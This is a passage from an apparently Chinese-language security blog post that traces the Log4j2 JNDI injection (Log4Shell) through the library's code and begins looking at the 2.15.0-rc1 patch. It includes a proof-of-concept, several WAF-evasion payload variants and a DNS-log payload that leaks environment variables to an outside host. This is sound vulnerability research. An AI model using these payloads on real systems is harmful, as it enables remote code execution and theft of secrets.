class="token plain">lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lookup:94, ldapURLContext (com.sun.jndi.url.ldap)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lookup:417, InitialContext (javax.naming)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lookup:172, JndiManager (org.apache.logging.log4j.core.net)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lookup:221, Interpolator (org.apache.logging.log4j.core.lookup)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">toText:244, PatternLayout (org.apache.logging.log4j.core.layout)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">encode:229, PatternLayout (org.apache.logging.log4j.core.layout)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">encode:59, PatternLayout (org.apache.logging.log4j.core.layout)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log:481, LoggerConfig (org.apache.logging.log4j.core.config)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log:456, LoggerConfig (org.apache.logging.log4j.core.config)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log:161, Logger (org.apache.logging.log4j.core)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">error:740, AbstractLogger (org.apache.logging.log4j.spi)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">main:9, Test</span><br></span></code></pre></div></div>
<p>最明显的漏洞触发点，就是在第16行<code>lookup:172, JndiManager (org.apache.logging.log4j.core.net)</code></p>
<p>跟过去看下，典型的JNDI注入</p>
<p><img decoding="async" loading="lazy" alt="image-20211210094235199" src="/assets/images/image-20211210094235199-e69bf3f03a76551321237c1515b69b1f.png" width="3584" height="2240" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="debug分析">Debug分析<a href="#debug分析" class="hash-link" aria-label="Debug分析的直接链接" title="Debug分析的直接链接">​</a></h3>
<p>既然已经知道调用栈了，那么就可以慢慢分析了</p>
<p>从<code>logger.error</code>为入口，跟进去后会前期有一系列的和我们分析无关的过程，主要就是各种常规包装和调用</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">toText:244, PatternLayout (org.apache.logging.log4j.core.layout)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">encode:229, PatternLayout (org.apache.logging.log4j.core.layout)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">encode:59, PatternLayout (org.apache.logging.log4j.core.layout)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log:481, LoggerConfig (org.apache.logging.log4j.core.config)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log:456, LoggerConfig (org.apache.logging.log4j.core.config)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log:161, Logger (org.apache.logging.log4j.core)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">error:740, AbstractLogger (org.apache.logging.log4j.spi)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">main:9, Test</span><br></span></code></pre></div></div>
<p>然后一直到了<code>org.apache.logging.log4j.core.layout.PatternLayout.PatternSerializer#toSerializable(org.apache.logging.log4j.core.LogEvent, java.lang.StringBuilder)</code>，这个的主要功能就是通过遍历<code>formatters</code>一段一段的拼接输出的内容</p>
<p><img decoding="async" loading="lazy" alt="image-20211211122610115" src="/assets/images/image-20211211122610115-e06562cd5abd24556c6f7525e262cf75.png" width="3584" height="2240" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="image-20211211122639788" src="/assets/images/image-20211211122639788-616fe56c421f9e219a9350705578be37.png" width="3584" height="2240" class="img_ev3q"></p>
<p>当到了格式化我们传入的内容的时候，同样的会进行<code>format</code>处理，跟进发现会调用<code>converter.format()</code>，<code>converter</code>属于<code>MessagePatternConverter</code>类</p>
<p><img decoding="async" loading="lazy" alt="image-20211211121844651" src="/assets/images/image-20211211121844651-2c1ad5c012d1b1c3f58f48dbcd6d86b2.png" width="3584" height="2240" class="img_ev3q"></p>
<p>所以就到了<code>org.apache.logging.log4j.core.pattern.MessagePatternConverter#format</code></p>
<p>分析代码，可以看到，如果写入的日志内容中包含<code>${</code>，就会将我们输入的内容从<code>workingBuilder</code>分割出来，赋值给<code>value</code>，然后调用<code>config.getStrSubstitutor().replace()</code>方法</p>
<p><img decoding="async" loading="lazy" alt="image-20211210104613387" src="/assets/images/image-20211210104613387-3153ede40051849eb2e52dfa545e6971.png" width="3584" height="2240" class="img_ev3q"></p>
<p>跟进<code>replace()</code>，会调用<code>substitute()</code>方法</p>
<p>在<code>org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute(org.apache.logging.log4j.core.LogEvent, java.lang.StringBuilder, int, int, java.util.List&lt;java.lang.String&gt;)</code>方法中，会首先遍历字符，通过正则判断，获取<code>${</code>和<code>}</code>的位置，最后截取出<code>${</code>和<code>}</code>中间的内容，得到<code>jndi:xxxx</code></p>
<p><img decoding="async" loading="lazy" alt="image-20211210110328994" src="/assets/images/image-20211210110328994-6092aa7aa3e9b1f6cee94bd3617d320e.png" width="3584" height="2240" class="img_ev3q"></p>
<p>然后再次递归调用<code>substitute()</code>，继续截取<code>${}</code>中的内容，主要是为了判断是否还有<code>${}</code>，后续还有分隔符的判断，就先不管了</p>
<p>一直跟到解析变量这，跟进这个函数</p>
<p><img decoding="async" loading="lazy" alt="image-20211210111952428" src="/assets/images/image-20211210111952428-0818d44ba25a115d6799d76c48468f3c.png" width="3584" height="2240" class="img_ev3q"></p>
<p>可以猜测<code>resolver</code>解析时支持的关键词有<code>[date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j]</code>，而我们这里利用的<code>jndi:xxx</code>后续就会用到<code>JndiLookup</code>这个解析器</p>
<p><img decoding="async" loading="lazy" alt="image-20211210112247264" src="/assets/images/image-20211210112247264-4c6df80ca9744722b0528b2a727f8a93.png" width="3584" height="2240" class="img_ev3q"></p>
<p>跟进<code>lookup</code>，就是通过<code>:</code>分割前面的关键词<code>jndi</code>部分和后面的<code>payload</code>内容部分，再获取解析器，通过解析器去<code>lookup</code></p>
<p><img decoding="async" loading="lazy" alt="image-20211210113045092" src="/assets/images/image-20211210113045092-fcbce3d892d2830e471d81ffbc0d2a20.png" width="3584" height="2240" class="img_ev3q"></p>
<p>继续跟进<code>org.apache.logging.log4j.core.lookup.JndiLookup#lookup</code>，会初始化JNDI客户端，继续调用<code>lookup</code></p>
<p><img decoding="async" loading="lazy" alt="image-20211210113423856" src="/assets/images/image-20211210113423856-a55e248bdd13016d62a3f2a48b4a1569.png" width="3584" height="2240" class="img_ev3q"></p>
<p>再跟进就是非常常规的JNDI注入点了，分析也到此结束</p>
<p><img decoding="async" loading="lazy" alt="image-20211210113508239" src="/assets/images/image-20211210113508239-8f993af6ede0443016149ac39b432953.png" width="3074" height="1024" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="总结">总结<a href="#总结" class="hash-link" aria-label="总结的直接链接" title="总结的直接链接">​</a></h3>
<p>总结一下整个分析过程，也很简单</p>
<ol>
<li>先判断内容中是否有<code>${}</code>，然后截取<code>${}</code>中的内容，得到我们的恶意payload <code>jndi:xxx</code></li>
<li>后使用<code>:</code>分割payload，通过前缀来判断使用何种解析器去<code>lookup</code></li>
<li>支持的前缀包括<code>date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j</code>，可以研究下其他的，说不定有文章可做</li>
</ol>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="一个小坑">一个小坑<a href="#一个小坑" class="hash-link" aria-label="一个小坑的直接链接" title="一个小坑的直接链接">​</a></h2>
<p>网上有各种百度、icloud等大厂商被打的情况，但是最开始一直认为只有<code>logger.error()</code>才会触发，所以百思不得其解，难道用户搜索的所有内容都会被百度用<code>logger.error()</code>记录下来？很明显这是不可能的啊！！！</p>
<p><img decoding="async" loading="lazy" alt="image-20211210194148506" src="/assets/images/image-20211210194148506-1c1496362e8939582b510f53a26c0fe7.png" width="844" height="595" class="img_ev3q"></p>
<p>后面研究了半天，忽略了第一句话</p>
<blockquote>
<p><em><strong>此次漏洞触发条件为只要外部用户输入的数据会被日志记录，即可造成远程代码执行。</strong></em></p>
</blockquote>
<p>只要输入会被**<code>记录</code>**，就存在这个问题；什么情况下会记录呢？主要代码还是在</p>
<p><img decoding="async" loading="lazy" alt="image-20211212185601615" src="/assets/images/image-20211212185601615-2ddf699c4bb9e33ed78288c1a585e668.png" width="3582" height="692" class="img_ev3q"></p>
<p>一直跟到最后，<code>intLevel &gt;= level.intLevel()</code>为<code>false</code>，<code>intLevel</code>为我们使用的<code>INFO</code>等级的值200，<code>level.intLevel()</code>则为当前日志记录等级<code>ERROR</code>的值400</p>
<p><img decoding="async" loading="lazy" alt="image-20211212190556258" src="/assets/images/image-20211212190556258-67e0e64b72327187700d1de5e7b5527d.png" width="3406" height="660" class="img_ev3q"></p>
<p>这也是为什么<code>log4j</code>默认情况下只会记录<code>error</code>和<code>fatal</code>的日志，如下图，所以我们测试的时候只有<code>logger.error</code>和<code>fatal</code>的时候才会触发。</p>
<p><img decoding="async" loading="lazy" alt="image-20211210195141578" src="/assets/images/image-20211210195141578-bf45dd5c7106590592e1726dbbeed90d.png" width="2354" height="1768" class="img_ev3q"></p>
<p>因此其他日志等级也不是不能触发，修改一下日志记录等级，让它能够记录下来我们输入的payload，就可以触发漏洞了</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.logging.log4j.Level;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.logging.log4j.LogManager;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.logging.log4j.Logger;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.logging.log4j.core.config.Configurator;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Test {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    private static Logger logger = LogManager.getLogger(Test.class);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 第一个参数 &quot;Test&quot; 为类名</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Configurator.setLevel(&quot;Test&quot;, Level.INFO);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        logger.info(&quot;${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211210195519984" src="/assets/images/image-20211210195519984-e587e108577617ca094099f6da7c519d.png" width="2776" height="1706" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="常规绕过">常规绕过<a href="#常规绕过" class="hash-link" aria-label="常规绕过的直接链接" title="常规绕过的直接链接">​</a></h2>
<p>现在很多WAF都是检测是否存在<code>jndi:</code>等关键词来判断，这个很明显拦得了一时，拦不了一世啊！！！</p>
<p>通过上面的分析，我们也看到了有很多其他的解析器可用，包括<code>date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j</code>，还有分隔符啥的，结合起来可以绕过大多数常见的WAF了。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="多个执行流程">多个$<!-- -->执行流程<a href="#多个执行流程" class="hash-link" aria-label="多个执行流程的直接链接" title="多个执行流程的直接链接">​</a></h3>
<p>先来分析一下多个<code>${}</code>的执行流程，Payload举例如下：</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">${aaa:${bbb:ccc}dd}${ee:ff}</span><br></span></code></pre></div></div>
<p>当识别到多个<code>${}</code>时，准备来说是识别到多个<code>${</code>时，主要分为两种情况：</p>
<ol>
<li>
<p>当属于嵌套类型时，比如<code>${${}}</code>，参数<code>nestedVarCount</code>会执行+1操作，表示存在嵌套，防止找错闭合时用的<code>}</code>，会先处理内部的<code>${}</code>，再将处理结果返回后继续处理<code>${}</code> ；具体的原因，就是因为会递归调用<code>substitute()</code>，所以会先把内部的处理完</p>
<p><img decoding="async" loading="lazy" alt="image-20211211142435846" src="/assets/images/image-20211211142435846-5bdd27212f00299138db811258afbcf1.png" width="3584" height="2240" class="img_ev3q"></p>
</li>
<li>
<p>当属于并列类型时，比如<code>${}${}</code>，会依次处理<code>${}</code>；因为他一次只会提取一整个<code>${}</code></p>
</li>
</ol>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="分隔符">分隔符<a href="#分隔符" class="hash-link" aria-label="分隔符的直接链接" title="分隔符的直接链接">​</a></h3>
<p><code>org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute()</code>里处理完<code>${}</code>后，就会有一部分的分隔符处理，一个是<code>valueEscapeDelimiterMatcher [:\-]</code>，另一个是<code>valueDelimiterMatcher [:-]</code></p>
<hr>
<p>先来看第一个<code>valueEscapeDelimiterMatcher</code>，payload <code>${aa:\\-bb}</code></p>
<p>从下图可以看出来，就是给 <code>:\-</code> 中的 <code>\</code> 去掉了变成了<code>:-</code>，好像是没啥用</p>
<p><img decoding="async" loading="lazy" alt="image-20211211160840663" src="/assets/images/image-20211211160840663-bfb3b9bd3e9d49de32bafada0564b272.png" width="3584" height="2240" class="img_ev3q"></p>
<hr>
<p>再来看看<code>valueDelimiterMatcher</code>，payload <code>${aa:-bb}</code></p>
<p>从下面可以看出来，被<code>:-</code>分割成了前后两部分，前面的部分赋值给<code>varName</code>，后面部分赋值给<code>varDefaultValue</code>；</p>
<p><img decoding="async" loading="lazy" alt="image-20211211162535118" src="/assets/images/image-20211211162535118-eb4619fa272fb07f26cc072cd96abdfd.png" width="3584" height="2240" class="img_ev3q"></p>
<ul>
<li>
<p><code>varName</code>会被传入到<code>resolveVariable()</code>进行解析，如果没有协议什么的，就会返回<code>null</code></p>
</li>
<li>
<p>如果<code>resolveVariable()</code>返回值为<code>null</code>，<code>varDefaultValue</code>在后续的过程中也会递归调用<code>substitute</code></p>
</li>
</ul>
<p><img decoding="async" loading="lazy" alt="image-20211211170033001" src="/assets/images/image-20211211170033001-5b0f34db9da6a291ce107b5acf209d62.png" width="3286" height="622" class="img_ev3q"></p>
<p>最后会返回<code>varDefaultValue</code>的值</p>
<p><img decoding="async" loading="lazy" alt="image-20211211170508262" src="/assets/images/image-20211211170508262-c6494cdc0020b475b8d489c572571355.png" width="1932" height="466" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="其他解析器功效">其他解析器功效<a href="#其他解析器功效" class="hash-link" aria-label="其他解析器功效的直接链接" title="其他解析器功效的直接链接">​</a></h3>
<p>上面分析我们也注意到了，有多个解析协议可用，包括<code>date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j</code>，我们来分析一下作用</p>
<blockquote>
<p>可以下断点到<code>org.apache.logging.log4j.core.lookup.StrSubstitutor#resolveVariable</code>的<code>resolver.lookup(event, variableName)</code>这一行，然后动态执行看效果；比如</p>
<p><img decoding="async" loading="lazy" alt="image-20211211145033551" src="/assets/images/image-20211211145033551-6fec810e3a9f3accc03e687965fe0295.png" width="3208" height="710" class="img_ev3q"></p>
</blockquote>
<table><thead><tr><th style="text-align:left">解析协议</th><th>说明</th></tr></thead><tbody><tr><td style="text-align:left"><code>date:</code></td><td>日期时间（详情<code>org.apache.logging.log4j.core.lookup.DateLookup#lookup</code>）</td></tr><tr><td style="text-align:left"><code>java:</code></td><td>一些JVM的信息（可用参数<code>version、runtime、vm、os、hw、locale</code>，详情<code>org.apache.logging.log4j.core.lookup.JavaLookup#lookup</code>）</td></tr><tr><td style="text-align:left"><code>marker:</code></td><td>返回<code>event.getMarker()</code>，不知道具体干啥的</td></tr><tr><td style="text-align:left"><code>ctx:key</code></td><td>返回<code>event.getContextData().getValue(key)</code>，就是获取上下文的数据</td></tr><tr><td style="text-align:left"><strong><code>lower:KEY</code></strong></td><td>返回字符串小写值</td></tr><tr><td style="text-align:left"><strong><code>upper:key</code></strong></td><td>返回字符串大写值</td></tr><tr><td style="text-align:left"><code>jndi:</code></td><td>JNDI注入利用点，不多说了</td></tr><tr><td style="text-align:left"><code>main:key</code></td><td>返回<code>((MapMessage) event.getMessage()).get(key)</code>，也是获取一些变量值</td></tr><tr><td style="text-align:left"><code>jvmrunargs:</code></td><td>没搞懂。。。</td></tr><tr><td style="text-align:left"><code>sys:key</code></td><td>返回一些系统属性：<code>System.getProperty(key)</code></td></tr><tr><td style="text-align:left"><code>env:key</code></td><td>返回<code>System.getenv(key)</code></td></tr><tr><td style="text-align:left"><code>log4j:key</code></td><td>返回一些<code>log4j</code>的配置信息，可用值<code>configLocation、configParentLocation</code></td></tr></tbody></table>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="绕过思路">绕过思路<a href="#绕过思路" class="hash-link" aria-label="绕过思路的直接链接" title="绕过思路的直接链接">​</a></h3>
<p>我们已经知道了<code>${}</code>的执行流程，也知道了分隔符怎么处理的，又知道了其他协议的解析返回值，那么就可以构造payload来绕过了，举一些例子</p>
<ul>
<li>原始payload</li>
</ul>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}</span><br></span></code></pre></div></div>
<ul>
<li>一些绕过paylioad</li>
</ul>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">${${a:-j}ndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">${${a:-j}n${::-d}i:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">${${lower:jn}di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">${${lower:${upper:jn}}di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">${${lower:${upper:jn}}${::-di}:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="奇淫技巧">奇淫技巧<a href="#奇淫技巧" class="hash-link" aria-label="奇淫技巧的直接链接" title="奇淫技巧的直接链接">​</a></h3>
<p>刚才分析了<a href="#%E5%85%B6%E4%BB%96%E8%A7%A3%E6%9E%90%E5%99%A8%E5%8A%9F%E6%95%88">其他解析器功效</a>，通过<code>sys</code>和<code>env</code>协议，结合<code>jndi</code>可以读取到一些环境变量和系统变量，特定情况下可能可以读取到系统密码</p>
<p>举个例子</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">${jndi:ldap://${env:LOGNAME}.eynz6t.dnslog.cn}</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211211172428046" src="/assets/images/image-20211211172428046-b77ff2da8329c56585250be45d534c20.png" width="1452" height="360" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="2150-rc1补丁绕过">2.15.0-rc1补丁绕过<a href="#2150-rc1补丁绕过" class="hash-link" aria-label="2.15.0-rc1补丁绕过的直接链接" title="2.15.0-rc1补丁绕过的直接链接">​</a></h2>
<p><a href="https://github.com/apache/logging-log4j2/commit/d82b47c6fae9c15fcb183170394d5f1a01ac02d3" target="_blank" rel="noopener noreferrer">LOG4J2-3201 Commit</a></p>
<p>和之前一样，直接来到<code>org.apache.logging.log4j.core.layout.PatternLayout.PatternFormatterPatternSerializer#toSerializable</code>；熟悉的遍历<code>formatter</code>拼接输出内容</p>
<p><img decoding="async" loading="lazy" alt="image-20211211202514773" src="/assets/images/image-20211211202514773-616f5ed566bcda7a72f8d90e3c474a34.png" width="3584" height="2240" class="img_ev3q"></p>
<p>到了拼接我们自定义内容的部分的时候，跟进会调用<code>converter.format</code>，可以看到这里的<code>converter</code>类已经变成了<code>MessagePatternConverter.SimpleMessagePatternConverter</code>，<code>SimpleMessagePatternConverter</code>是<code>MessagePatternConverter</code>的一个内部类</p>
<p><img decoding="async" loading="lazy" alt="image-20211211203318239" src="/assets/images/image-20211211203318239-fafbea605a12d4d98e0f289e40f2c980.png" width="3584" height="2240" class="img_ev3q"></p>
<p>跟进，发现会调用<code>((StringBuilderFormattable) msg).formatTo(toAppendTo)</code></p>
<p><img decoding="async" loading="lazy" alt="image-20211212100007498" src="/assets/images/image-20211212100007498-e0cd3516d352b58ebdbb2efbc5111aa8.png" width="1288" height="426" class="img_ev3q"></p>
<p>再跟进<code>formatTo</code>，可以看出就是直接拼接字符串，并不会对包含有特殊内容<code>${}</code>的字符串进行处理</p>
<p><img decoding="async" loading="lazy" alt="image-20211212100040460" src="/assets/images/image-20211212100040460-3c737273382ef6b9dadc54977bf29921.png" width="1348" height="168" class="img_ev3q"></p>
<hr>
<p>看着是没问题了，但是发现在<code>MessagePatternConverter</code>中还有一个内部类<code>LookupMessagePatternConverter</code>，这个类会对<code>${</code>的内容进行特殊处理。</p>
<p><img decoding="async" loading="lazy" alt="image-20211212102131892" src="/assets/images/image-20211212102131892-5516df68ef0f9fb1f0a0841aeca06682.png" width="2178" height="982" class="img_ev3q"></p>
<p>但是怎么样才能让<code>converter</code>的类变成<code>LookupMessagePatternConverter</code>，而不是<code>SimpleMessagePatternConverter</code>呢？</p>
<p>在<code>newInstance</code>这个初始化配置函数的地方下个断点，发现必须要满足2个条件，才能使用<code>LookupMessagePatternConverter</code>这个<code>converter</code>类</p>
<p><img decoding="async" loading="lazy" alt="image-20211212102704541" src="/assets/images/image-20211212102704541-9b41b6cc2f2971935c07ef0355362ec2.png" width="3584" height="2240" class="img_ev3q"></p>
<blockquote>
<p>所以这也是补丁绕过比较鸡肋的地方，需要自己手动修改配置，正常人会故意这么写吗？</p>
<p>为了分析绕过，我们只能手动配置了。。。</p>
</blockquote>
<p>分析上面需要满足的2个条件：</p>
<ol>
<li>
<p><code>lookups</code>为<code>true</code>，<code>lookups</code>的值是通过<code>loadLookups(options)</code>这个函数来获得的，分析一下这个函数，只要<code>options</code>这个字符串数组包含<code>lookups</code>即可</p>
